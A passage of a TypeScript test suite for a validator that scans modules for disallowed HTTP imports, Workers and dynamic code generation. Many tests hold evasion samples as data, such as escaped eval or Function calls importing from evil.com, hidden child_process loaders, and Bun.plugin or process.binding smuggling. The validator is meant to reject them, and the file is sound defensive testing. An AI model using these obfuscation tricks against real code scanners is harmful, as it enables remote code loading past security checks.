          `const holder = { Base: class { static plugin = Bun.plugin; } };` +
          ` class Cap extends holder.Base {}` +
          ` Cap.plugin({ name: "route", setup() {} });`,
          `const holder = () => ({ Base: class {` +
          ` static binding() { return process.binding; } } });` +
          ` class Cap extends holder().Base {}` +
          ` Cap.binding()("spawn_sync").spawn({});`,
          `const bases = [class { static plugin = Bun.plugin; }];` +
          ` class Cap extends bases[0] {}` +
          ` Cap.plugin({ name: "route", setup() {} });`,
          `const holder = () => ({ Base: class { plugin() { return Bun.plugin; } } });` +
          ` class Cap extends holder().Base {}` +
          ` new Cap().plugin()({ name: "route", setup() {} });`,
          `const local = () => {}; const caps = [Bun.plugin];` +
          ` if (false) caps[0] = local; caps[0]({ name: "route", setup() {} });`,
          `const local = () => {}; const caps = [Bun.plugin];` +
          ` class Cap { field = (caps[0] = local); }` +
          ` caps[0]({ name: "route", setup() {} });`,
          `const local = () => {}; const caps = [Bun.plugin];` +
          ` class Cap { #field = (caps[0] = local); }` +
          ` caps[0]({ name: "route", setup() {} });`,
          `const local = () => {}; const caps = [Bun.plugin];` +
          ` class Cap { accessor field = (caps[0] = local); }` +
          ` caps[0]({ name: "route", setup() {} });`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "a returned wrapper must retain its restricted runtime capability",
        );
      }
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `class Base { plugin() { return Bun.plugin; } }` +
              ` export default class Cap extends Base {}`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an exported subclass must retain inherited restricted capabilities",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = () => ({ Base: class { static plugin = Bun.plugin; } });` +
              ` export default class Cap extends holder().Base {}`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an exported subclass must retain wrapped inherited capabilities",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const getRequire = () => ({ require });` +
              ` getRequire().require("node:child_process");`,
            [],
          ),
        Error,
        "unconstrained dynamic import",
        "a returned object must not hide the CommonJS loader",
      );
    });

    it("should fail closed on parser-dependent capabilities when the parser is unavailable", async () => {
      __setSourceCapabilityParserLoaderForTests(() =>
        Promise.reject(new Error("parser unavailable"))
      );
      try {
        for (
          const source of [
            `process.binding("spawn_sync").spawn({});`,
            `process.execve(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
            `new Deno.Command("deno", { args: ["run", "./unchecked.ts"] });`,
            `Bun.spawn(["bun", "./unchecked.ts"]);`,
            `process.getBuiltinModule("node:test");`,
            `const loaders = {}; loaders.load = require; loaders.load("./unchecked.cjs");`,
            `const assign = Object.assign; export { assign };`,
          ]
        ) {
          await assertRejects(
            async () => await validateHTTPImports(source, []),
            Error,
            "dynamic code generation",
            "parser failure must reject capabilities that the textual scanner cannot classify",
          );
        }

        await validateHTTPImports(
          `const value = 1; export const GET = () => new Response(String(value));`,
          [],
        );
        await validateHTTPImports(
          `import value from "https://allowed.example/mod.js"; export { value };`,
          ["https://allowed.example"],
        );
      } finally {
        __setSourceCapabilityParserLoaderForTests();
      }
    });

    it("should not exempt global arguments passed to a shadowed Reflect", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Reflect = { get: (value: typeof globalThis) => value.Worker };` +
              ` const W = Reflect.get(globalThis);` +
              ` new W("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "dynamic code generation",
        "passing the global object to arbitrary local code must fail closed",
      );
    });

    it("should ignore inert Worker text and locally bound constructors", async () => {
      await validateHTTPImports(
        `const note = 'new Worker("https://blocked.example/mod.js")';\n` +
          'const template = `new Worker("https://blocked.example/template.js")`;\n' +
          `const pattern = /new Worker\\("https:\\/\\/blocked\\.example\\/regex\\.js"\\)/;\n` +
          `// new Worker("https://blocked.example/comment.js");\n` +
          `export const GET = () => new Response(note + template + pattern.source);`,
        [],
      );
      await validateHTTPImports(
        `class Worker { constructor(_value: string) {} }` +
          ` const local = new Worker("https://blocked.example/mod.js");` +
          ` export const GET = () => new Response(String(local));`,
        [],
      );
      await validateHTTPImports(
        `const Thing = getThing(); const local = new Thing("https://blocked.example/mod.js");`,
        [],
      );
    });

    it("should accept a Worker that loads a local module URL", async () => {
      await validateHTTPImports(
        `const w = new Worker(new URL("./worker.ts", import.meta.url), { type: "module" });`,
        [],
      );
      await validateHTTPImports(`const w = new Worker("./worker.ts", { type: "module" });`, []);
    });

    it("should reject relative string Workers reached through constructors a bundle cannot wrap", async () => {
      for (
        const construction of [
          `new globalThis.Worker("./worker.ts")`,
          `new self.Worker("./worker.ts")`,
          `new RouteWorker("./worker.ts")`,
          `new DestructuredWorker("./worker.ts")`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `const RouteWorker = globalThis.Worker;` +
                ` const { Worker: DestructuredWorker } = globalThis;` +
                ` ${construction};`,
              [],
            ),
          Error,
          "relative string Worker constructor cannot be preserved while bundling",
          `${construction} must not bypass the route-relative Worker wrapper`,
        );
      }

      // An explicit URL is already absolute at runtime and needs no wrapper.
      await validateHTTPImports(
        `const { Worker: RouteWorker } = globalThis;` +
          ` new RouteWorker(new URL("./worker.ts", import.meta.url));`,
        [],
      );
    });

    it("should reject a Worker whose relative URL resolves against a remote base", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const w = new Worker(new URL("./mod.js", "https://blocked.example/"), { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a relative worker specifier lands wherever its base points, so a remote base is a remote worker",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const w = new Worker(new URL("./mod.js", baseUrl), { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a base this scanner cannot read leaves the worker URL unknown and must fail closed",
      );
    });

    it("should reject file-scheme Worker entries the project walk cannot contain", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `new Worker("file:///outside/project/worker.ts", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `new Worker(new URL("./worker.ts", "file:///outside/project/"));`,
            [],
          ),
        Error,
        "Worker",
      );
    });

    it("should fail closed on literal worker bases the textual scanner does not resolve", async () => {
      __setSourceCapabilityParserLoaderForTests(() =>
        Promise.reject(new Error("parser unavailable"))
      );
      try {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `new Worker(new URL("./mod.js", " https://evil.example/base/"), { type: "module" });`,
              [],
            ),
          Error,
          "Worker",
          "the URL constructor trims the base and fetches remotely, so a padded base must not scan as local",
        );
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `new Worker(new URL("./mod.js", "./base/"), { type: "module" });`,
              [],
            ),
          Error,
          "Worker",
          "a relative base names an entry no graph walk can vet and must not pass validation",
        );
      } finally {
        __setSourceCapabilityParserLoaderForTests();
      }
    });

    it("should record only the worker entries whose base resolves against this module", async () => {
      assertEquals(
        await collectLocalWorkerSpecifiers(
          `const a = new Worker(new URL("./a.ts", import.meta.url)); const b = new Worker("./b.ts");`,
        ),
        ["./a.ts", "./b.ts"],
        "a caller vetting the graph needs the entry each local worker executes",
      );
      assertEquals(
        await collectLocalWorkerSpecifiers(
          `const w = new Worker(new URL("./mod.js", "file:///elsewhere/"));`,
        ),
        [null],
        "a local base this scanner does not follow gives no specifier the graph walk can resolve",
      );
      assertEquals(
        await collectLocalWorkerSpecifiers(`export const GET = () => new Response("ok");`),
        [],
        "a handler that starts no worker contributes no entries",
      );
    });

    it("should read the module clause past an import binding named from", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import { from as value } from "https://blocked.example/mod.js";\nexport const GET = () => value;`,
            [],
          ),
        Error,
        "blocked.example",
        "`from` is a legal binding name, and the real module clause must still be allow-listed",
      );
      assertEquals(
        extractModuleSpecifiers(
          `import { from as value } from "https://esm.sh/mod.js";`,
        ),
        ["https://esm.sh/mod.js"],
        "the specifier follows the module clause, not the first contextual `from`",
      );
    });

    it("should not read a keyword out of a name ending in non-ASCII letters", async () => {
      const source = `const caf\u00e9import = (value) => value;\n` +
        `export const GET = () => caf\u00e9import("https://blocked.example/value");`;
      await validateHTTPImports(source, []);
      assertEquals(
        extractModuleSpecifiers(source),
        [],
        "`import` inside an identifier is part of the name, so its call argument is no specifier",
      );
    });

    it("should still accept a global property read under a name it can resolve", async () => {
      const source = `const subtle = globalThis["crypto"]; export const GET = () => subtle;`;
      await validateHTTPImports(source, []);
      assertEquals(
        scanModuleSpecifiers(source).hasDynamicCodeGeneration,
        false,
        "a literal property name resolves to a harmless global and must keep loading",
      );
    });

    it("should still accept template literals that name no generator", async () => {
      const source =
        "export const page = `<p>${title}</p>`; export const note = `\\x65valuation harness`;";
      await validateHTTPImports(source, []);
      assertEquals(
        scanModuleSpecifiers(source).hasDynamicCodeGeneration,
        false,
        "an interpolated template and an escape that decodes to a non-generator word must both be accepted",
      );
    });

    it("should still accept escaped string literals that name no generator", async () => {
      await validateHTTPImports(
        `export const label = "\\x65valuation harness"; export const flag = "\\u0063onstruct";`,
        [],
      );
      assertEquals(
        scanModuleSpecifiers(
          `export const label = "\\x65valuation harness"; export const flag = "\\u0063onstruct";`,
        ).hasDynamicCodeGeneration,
        false,
        "an escape that decodes to a non-generator word must not be reported as dynamic code generation",
      );
    });

    it("should reject a dynamic code generator spelled with identifier escapes", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `globalThis.\\u0065val('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\uXXXX escape binds eval and must be decoded before the generator scan",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `globalThis.\\u{65}val('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a code-point escape binds eval and must be decoded before the generator scan",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `globalThis.\\u0046unction('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an escaped Function reference must be decoded before the generator scan",
      );
    });

    it("should ignore ordinary member calls named import", async () => {
      await validateHTTPImports(
        `const value = client.import("https://evil.com/not-a-module.js");`,
        ["https://esm.sh"],
      );
      await validateHTTPImports(
        `const value = client?.import("https://evil.com/not-a-module.js");`,
        ["https://esm.sh"],
      );
      await validateHTTPImports(
        `class Client { #import = (_url: string) => "private"; value() { return this.#import("https://evil.com/not-a-module.js"); } }`,
        ["https://esm.sh"],
      );
    });

    it("should allow fully static dynamic imports with import attributes", async () => {
      await validateHTTPImports(
        `const mod = await import("https://esm.sh/data.json", { with: { type: "json" } });`,
        ["https://esm.sh"],
      );
    });

    it("should ignore private member calls named import", async () => {
      await validateHTTPImports(
        [
          `class Client {`,
          `  #import(url: string) { return url; }`,
          `  load() { return this.#import("https://evil.com/not-a-module.js"); }`,
          `}`,
        ].join("\n"),
        ["https://esm.sh"],
      );
    });

    it("should allow multiple hosts", async () => {
      await validateHTTPImports(
        'import a from "https://esm.sh/react";\nimport b from "https://cdn.example.com/lib.js";',
        ["https://esm.sh", "https://cdn.example.com"],
      );
    });

    it("should not flag non-HTTP imports", async () => {
      await validateHTTPImports(
        'import { foo } from "./local.ts";\nimport bar from "lodash";',
        ["https://esm.sh"],
      );
    });

    it("should handle source with no imports", async () => {
      await validateHTTPImports("const x = 1;", ["https://esm.sh"]);
    });
  });

  describe("extractModuleSpecifiers", () => {
    it("should collect local, bare, and remote specifiers across import forms", () => {
      const source = [
        `import { a } from "./helper.ts";`,
        `import "../side-effect.ts";`,
        `export { b } from "https://esm.sh/pkg";`,
        `import zod from "zod";`,
        `const load = () => import("./lazy.ts");`,
        'const rendered = `prefix ${import("./inside-template.ts")} suffix`;',
        `// import "./commented-out.ts";`,
        `const text = 'import "./inside-string.ts";';`,
        `const ignored = client.import("./not-a-module.ts");`,
      ].join("\n");

      assertEquals(extractModuleSpecifiers(source), [
        "./helper.ts",
        "../side-effect.ts",
        "https://esm.sh/pkg",
        "zod",
        "./lazy.ts",
        "./inside-template.ts",
      ]);
    });

    it("preserves multiline static import support", () => {
      const source = [
        `import {`,
        `  parse,`,
        `  stringify,`,
        `} from "https://esm.sh/yaml@2";`,
      ].join("\n");

      assertEquals(extractModuleSpecifiers(source), ["https://esm.sh/yaml@2"]);
    });
  });

  describe("scanModuleSpecifiers", () => {
    it("should require bundling when slash syntax can hide an import", () => {
      const scan = scanModuleSpecifiers(
        `const marker = /"/; import "https://evil.com/mod.js";`,
      );

      assertEquals(scan.requiresBundling, true);
    });

    it("should flag dynamic imports whose target is not a literal", () => {
      assertEquals(
        scanModuleSpecifiers(`const mod = import("https://" + host + "/mod.js");`),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should flag dynamic imports whose target is a template literal", () => {
      assertEquals(
        scanModuleSpecifiers("const mod = import(`https://${host}/mod.js`);"),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should fail closed when a template literal never terminates", () => {
      // An unterminated template swallows the rest of the file, so the scan
      // cannot claim the hidden text names no unconstrained import.
      const scan = scanModuleSpecifiers(
        "const tail = `never closed\nimport(target);",
      );
      assertEquals(
        scan.hasUnconstrainedDynamicImport,
        true,
        "an unreadable template must not yield a scan that reports no unconstrained import",
      );
    });

    it("should flag non-literal dynamic imports inside template interpolations", () => {
      assertEquals(
        scanModuleSpecifiers(
          "const rendered = `prefix ${import(remoteSpecifier)} suffix`;",
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should flag a dynamic import a regex brace hid inside an interpolation", () => {
      // A `}` inside a character class used to close the `${...}` walk early,
      // leaving the rest of the executable expression read as template text.
      assertEquals(
        scanModuleSpecifiers(
          'const rendered = `${/[}]/.test("}") ? import(remoteSpecifier) : ""}`;',
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
        "a regular-expression literal must not truncate the interpolation it sits in",
      );
    });

    it("should still accept ordinary division inside an interpolation", () => {
      assertEquals(
        scanModuleSpecifiers("export const half = (n: number) => `${n / 2} halves`;"),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
        "arithmetic in a template must bundle without being reported as a hidden import",
      );
    });

    it("should flag non-literal dynamic imports after lexical slash ambiguity", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const marker = /"/; const target = "https://blocked.example/mod.js"; import(target);`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should flag non-literal dynamic imports after keyword-context regex literals", () => {
      for (
        const source of [
          `function marker() { return /"/; } const target = "https://blocked.example/mod.js"; import(target);`,
          `function marker() { throw /"/; } const target = "https://blocked.example/mod.js"; import(target);`,
          `switch (value) { case /"/: break; } const target = "https://blocked.example/mod.js"; import(target);`,
          `if (ready) /"/.test(""); const target = "https://blocked.example/mod.js"; import(target);`,
          `while (ready) /"/.test(""); const target = "https://blocked.example/mod.js"; import(target);`,
        ]
      ) {
        assertEquals(scanModuleSpecifiers(source), {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        });
      }
    });

    it("should flag non-literal dynamic imports after same-statement regex literals", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const marker = /"/, target = "https://blocked.example/mod.js", load = import(target);`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should collect static dynamic imports after same-statement regex literals", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const marker = /"/, load = import("https://esm.sh/mod.js");`,
        ),
        {
          specifiers: ["https://esm.sh/mod.js"],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should flag non-literal dynamic imports after a regex literal following a block", () => {
      assertEquals(
        scanModuleSpecifiers(
          `if (ready) {} /"/.test(""); const target = "https://evil.com/mod.js"; import(target);`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: true,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
        "a regex opening after a block must not let its quote hide the later non-literal import",
      );
    });

    it("should not treat strings and comments after ordinary division as imports", () => {
      assertEquals(
        scanModuleSpecifiers(
          [
            `const ratio = a / b;`,
            `const text = "import('https://evil.com/not-a-module.js')";`,
            `// import("https://evil.com/commented.js")`,
          ].join("\n"),
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should not treat strings after ordinary division on the same statement as imports", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const ratio = a / b, text = "import('https://evil.com/not-a-module.js')";`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should not treat comments after ordinary division as imports", () => {
      assertEquals(
        scanModuleSpecifiers(
          [
            `const ratio = a / b;`,
            `// import("https://evil.com/commented.js")`,
            `/* import("https://evil.com/blocked.js") */`,
          ].join("\n"),
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should collect static dynamic imports with import attributes", () => {
      assertEquals(
        scanModuleSpecifiers(
          `const mod = await import("https://esm.sh/data.json", { with: { type: "json" } });`,
        ),
        {
          specifiers: ["https://esm.sh/data.json"],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should collect a literal dynamic import with a trailing comma", () => {
      assertEquals(
        scanModuleSpecifiers(`const mod = await import("https://esm.sh/mod.js",);`),
        {
          specifiers: ["https://esm.sh/mod.js"],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
      );
    });

    it("should bundle literal dynamic imports before they can execute later", () => {
      assertEquals(
        scanModuleSpecifiers(`export const load = () => import("./helper.ts?deferred");`),
        {
          specifiers: ["./helper.ts?deferred"],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: true,
          hasDynamicCodeGeneration: false,
        },
        "a deferred local dependency must be captured during validation",
      );
    });

    it("should ignore private member calls named import", () => {
      assertEquals(
        scanModuleSpecifiers(
          `class Client { #import = (_url: string) => "private"; value() { return this.#import("https://evil.com/not-a-module.js"); } }`,
        ),
        {
          specifiers: [],
          hasUnconstrainedDynamicImport: false,
          requiresBundling: false,
          hasDynamicCodeGeneration: false,
        },
      );
    });
  });
});
